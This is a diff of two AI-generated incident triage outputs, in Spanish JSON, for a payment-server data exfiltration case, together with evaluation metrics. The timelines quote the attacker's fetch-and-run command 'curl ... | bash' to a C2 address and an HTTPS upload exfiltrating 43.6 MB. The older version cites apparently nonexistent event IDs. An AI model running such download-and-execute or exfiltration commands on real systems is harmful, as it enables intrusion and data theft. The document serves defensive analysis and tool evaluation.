@@ -7,16 +7,16 @@
   "Eventos en el expediente": 59,
   "Severidad": "Crítica",
   "Categoría": "Exfiltración de datos",
-  "Hitos en la línea de tiempo": 13,
+  "Hitos en la línea de tiempo": 15,
   "RAG (historial y ATT&CK)": "encendido",
-  "Técnicas ATT&CK en el triage": 10,
+  "Técnicas ATT&CK en el triage": 11,
   "Antecedentes del historial que aplican": "INC-2025-007, INC-2025-012, INC-2026-011",
   "Hitos clave de la historia citados (de 6, para A-0001)": "5/6",
   "¿Llegó al origen (phishing EV-001/EV-002)?": "No",
   "¿Cayó en la nota del atacante (EV-017)?": "No",
   "C1 · frases dirigidas a la IA eliminadas": 1,
   "C2 · ¿salieron nombres de usuario al proveedor?": "No (seudonimizados)",
-  "C3 · evidencia inexistente": "198.51.100.24, andinapagos-it.com (quitada)",
+  "C3 · evidencia inexistente": "ninguna",
   "C3 · ¿a revisión humana?": "No"
  },
  "triage": {
@@ -24,12 +24,22 @@
   "categoria": "Exfiltración de datos",
   "es_incidente": true,
   "confianza": "Alta",
-  "hipotesis": "Un atacante envió un enlace de phishing que llevó a m.rojas a aprobar una solicitud MFA desde una IP extranjera, luego accedió vía VPN desde Países Bajos. Desde el bastión se conectó por SSH a api-pagos-02, escaló privilegios con sudo, descargó y ejecutó un script malicioso mediante curl|bash, estableció persistencia en cron, robó credenciales de base de datos y realizó consultas masivas de datos de clientes, archivó la información y la exfiltró (43,6 MB) al servidor C2 198.51.100.24.",
+  "hipotesis": "Un atacante aprovechó la fatiga de MFA contra m.rojas, logró un login VPN desde Países Bajos, accedió al bastión y luego a api-pagos-02. Desde allí ejecutó un curl|bash que descargó un implante, estableció persistencia vía cron, robó credenciales de base de datos y consultó masivamente la tabla de clientes. Finalmente exfiltró ~43 MB de datos a la IP C2 198.51.100.24. La actividad coincide con el patrón del actor conocido como Cóndor Gris.",
   "linea_de_tiempo": [
    {
-    "hora": "2026-03-13 22:57:41",
+    "hora": "2026-03-13 22:51:10",
     "evento": "EV-003",
-    "que_paso": "MFA push rechazado (primer intento) desde IP 203.0.113.77"
+    "que_paso": "MFA push rechazado desde 203.0.113.77 (inicio de MFA fatigue)"
+   },
+   {
+    "hora": "2026-03-13 22:52:31",
+    "evento": "EV-004",
+    "que_paso": "MFA push rechazado adicionalmente desde 203.0.113.77"
+   },
+   {
+    "hora": "2026-03-13 22:57:41",
+    "evento": "EV-005",
+    "que_paso": "MFA push aprobado (el atacante obtuvo el factor)"
    },
    {
     "hora": "2026-03-13 22:58:03",
@@ -39,7 +49,7 @@
    {
     "hora": "2026-03-13 23:05:12",
     "evento": "EV-007",
-    "que_paso": "Conexión SSH al bastión-01 desde 10.8.0.23 (primer acceso en 90 días)"
+    "que_paso": "SSH al bastión-01 desde 10.8.0.23 (primer acceso al bastión en 90 días)"
    },
    {
     "hora": "2026-03-13 23:09:40",
@@ -49,27 +59,27 @@
    {
     "hora": "2026-03-13 23:10:02",
     "evento": "EV-009",
-    "que_paso": "Uso de sudo por m.rojas para abrir una shell bash"
+    "que_paso": "Uso de sudo para abrir una shell bash como root"
    },
    {
     "hora": "2026-03-13 23:14:27",
     "evento": "EV-010",
-    "que_paso": "Ejecución de curl -s http://198.51.100.24/a.sh | bash"
+    "que_paso": "Ejecutó curl -s http://198.51.100.24/a.sh | bash (descarga de payload)"
    },
    {
     "hora": "2026-03-13 23:14:31",
     "evento": "EV-011",
-    "que_paso": "Creación y ejecución de archivo /tmp/.cache/kworkerd"
+    "que_paso": "Creó y ejecutó /tmp/.cache/kworkerd (archivo malicioso)"
    },
    {
     "hora": "2026-03-13 23:16:05",
     "evento": "EV-012",
-    "que_paso": "Modificación del crontab de root para persistencia @reboot /tmp/.cache/kworkerd"
+    "que_paso": "Modificó crontab de root para persistencia @reboot /tmp/.cache/kworkerd"
    },
    {
     "hora": "2026-03-13 23:21:48",
     "evento": "EV-013",
-    "que_paso": "Lectura del archivo /etc/andina/pagos.env (credenciales DB)"
+    "que_paso": "Leyó archivo /etc/andina/pagos.env y obtuvo credenciales de DB"
    },
    {
     "hora": "2026-03-13 23:26:44",
@@ -79,21 +89,20 @@
    {
     "hora": "2026-03-13 23:31:02",
     "evento": "EV-016",
-    "que_paso": "Creación de archivo /tmp/.cache/c.tgz de 41 MB (archivado)"
+    "que_paso": "Creó archivo /tmp/.cache/c.tgz de 41 MB (archivado)"
    },
    {
     "hora": "2026-03-13 23:38:15",
     "evento": "EV-017",
-    "que_paso": "POST HTTPS a 198.51.100.24/upload, envío de 43,6 MB (exfiltración)"
+    "que_paso": "POST https://198.51.100.24/upload 43,6 MB enviados (exfiltración)"
    },
    {
     "hora": "2026-03-13 23:40:00",
     "evento": "EV-018",
-    "que_paso": "Generación de alerta NDR A-0001 por transferencia anómala"
+    "que_paso": "Generada alerta NDR A-0001 por transferencia saliente anómala"
    }
   ],
   "evidencia": [
-   "A-0001",
    "EV-003",
    "EV-004",
    "EV-005",
@@ -107,7 +116,9 @@
    "EV-013",
    "EV-015",
    "EV-016",
-   "EV-017"
+   "EV-017",
+   "EV-018",
+   "A-0001"
   ],
   "tecnicas_attack": [
    {
@@ -120,20 +131,32 @@
     ]
    },
    {
-    "id": "T1552.001",
-    "nombre": "Credentials In Files",
+    "id": "T1021.004",
+    "nombre": "SSH",
     "eventos": [
-     "EV-013"
+     "EV-007",
+     "EV-008"
     ]
    },
    {
     "id": "T1548.003",
     "nombre": "Sudo and Sudo Caching",
     "eventos": [
-     "EV-009",
-     "EV-312",
-     "EV-314",
-     "EV-361"
+     "EV-009"
+    ]
+   },
+   {
+    "id": "T1059.004",
+    "nombre": "Unix Shell",
+    "eventos": [
+     "EV-010"
+    ]
+   },
+   {
+    "id": "T1204.002",
+    "nombre": "Malicious File",
+    "eventos": [
+     "EV-011"
     ]
    },
    {
@@ -141,6 +164,27 @@
     "nombre": "Cron",
     "eventos": [
      "EV-012"
+    ]
+   },
+   {
+    "id": "T1552.001",
+    "nombre": "Credentials In Files",
+    "eventos": [
+     "EV-013"
+    ]
+   },
+   {
+    "id": "T1005",
+    "nombre": "Data from Local System",
+    "eventos": [
+     "EV-015"
+    ]
+   },
+   {
+    "id": "T1560.001",
+    "nombre": "Archive via Utility",
+    "eventos": [
+     "EV-016"
     ]
    },
    {
@@ -154,41 +198,7 @@
     "id": "T1090.003",
     "nombre": "Multi-hop Proxy",
     "eventos": [
-     "EV-006",
-     "EV-002",
-     "EV-206",
-     "EV-292"
-    ]
-   },
-   {
-    "id": "T1005",
-    "nombre": "Data from Local System",
-    "eventos": [
-     "EV-015",
-     "EV-236",
-     "EV-266"
-    ]
-   },
-   {
-    "id": "T1560.001",
-    "nombre": "Archive via Utility",
-    "eventos": [
-     "EV-016"
-    ]
-   },
-   {
-    "id": "T1078",
-    "nombre": "Valid Accounts",
-    "eventos": [
-     "EV-014"
-    ]
-   },
-   {
-    "id": "T1021.004",
-    "nombre": "SSH",
-    "eventos": [
-     "EV-007",
-     "EV-008"
+     "EV-006"
     ]
    }
   ],
@@ -196,32 +206,33 @@
    {
     "incidente": "INC-2025-007",
     "aplica": true,
-    "por_que": "MFA fatigue y login VPN desde NL con credenciales válidas, similar al vector inicial",
-    "leccion_para_hoy": "Implementar number‑matching en MFA y alertar inmediatamente cualquier login VPN desde país distinto al habitual"
+    "por_que": "MFA fatigue y login VPN desde NL, idéntico al vector usado aquí",
+    "leccion_para_hoy": "Activar number‑matching en MFA y validar logins VPN fuera de país antes de conceder acceso"
    },
    {
     "incidente": "INC-2025-012",
     "aplica": true,
-    "por_que": "Exfiltración de gran volumen de datos fuera de horario mediante HTTPS",
-    "leccion_para_hoy": "Activar DLP en proxy para detectar volúmenes anómalos y bloquear destinos no autorizados"
+    "por_que": "Exfiltración de gran volumen fuera de horario, similar al upload de 43 MB",
+    "leccion_para_hoy": "Implementar DLP en proxy para alertas de volúmenes anómalos y bloquear destinos C2"
    },
    {
     "incidente": "INC-2026-011",
     "aplica": true,
-    "por_que": "Consulta masiva de tabla clientes desde svc_pagos, comportamiento atípico de volumen",
-    "leccion_para_hoy": "Establecer límites de filas por consulta y generar alertas por desviaciones de patrones"
+    "por_que": "Consulta masiva de tabla clientes desde svc_pagos, patrón repetido",
+    "leccion_para_hoy": "Limitar consultas a <100 filas por operación y monitorizar picos de SELECT"
    }
   ],
-  "actor_probable": "Cóndor Gris (grupo financiero que usa phishing con dominios tipo <marca>-it.com, fatiga de MFA, VPN comercial y carga de implantes vía curl|bash)",
+  "actor_probable": "Cóndor Gris – grupo financiero que usa phishing de portales VPN falsos, MFA fatigue, acceso VPN comercial y descarga de implantes vía curl|bash, con infraestructura C2 en 198.51.100.0/24",
   "siguientes_pasos": [
    "Aislar y desconectar api-pagos-02 de la red",
-   "Bloquear tráfico saliente a 198.51.100.24 y a dominios sospechosos (andinapagos-it.com)",
-   "Revocar y rotar credenciales de svc_pagos y de m.rojas",
-   "Eliminar cron malicioso y archivo /tmp/.cache/kworkerd",
-   "Capturar memoria y discos de api-pagos-02 para análisis forense",
-   "Revisar y reforzar reglas de MFA (number‑matching, límites de intentos)",
-   "Notificar a Legal y a Protección de Datos por posible fuga de datos de clientes"
+   "Bloquear tráfico saliente a 198.51.100.24 y a dominios sospechosos (andinapagos‑it.com)",
+   "Capturar memoria y discos de api-pagos-02 y bastión-01 para análisis forense",
+   "Revocar y rotar credenciales de m.rojas, svc_ci y svc_pagos",
+   "Eliminar crontab malicioso y archivos /tmp/.cache/*",
+   "Revisar y reforzar políticas de sudo y privilegios heredados",
+   "Notificar a Legal y a Protección de Datos para evaluación de posible fuga de datos de clientes",
+   "Generar informe de incidente y actualizar reglas de detección de MFA fatigue y exfiltración"
   ],
-  "mensaje_ciso": "Se detectó una cadena de compromiso que culminó en la exfiltración de ~44 MB de datos de clientes desde el servidor de producción api-pagos-02 hacia un C2 identificado (198.51.100.24). El atacante aprovechó MFA fatigue y un acceso VPN desde Países Bajos, escaló privilegios con sudo y ejecutó un script malicioso. Ya hemos aislado el host, bloqueado el C2 y revocado credenciales; requerimos su aprobación para iniciar la notificación a clientes y a autoridades regulatorias, y para asignar recursos al análisis forense completo."
+  "mensaje_ciso": "Se detectó una exfiltración de datos confidenciales desde el servidor de producción api-pagos-02. Un atacante comprometió la cuenta m.rojas mediante MFA fatigue, accedió vía VPN desde Países Bajos, obtuvo privilegios de root y envió ~43 MB de información de clientes a un servidor C2 (198.51.100.24). El SOC ha aislado el host, bloqueado el C2 y está preservando evidencia. Necesitamos su autorización para iniciar la rotación completa de credenciales, notificar a los clientes afectados y coordinar con Legal para la respuesta regulatoria."
  }
 }
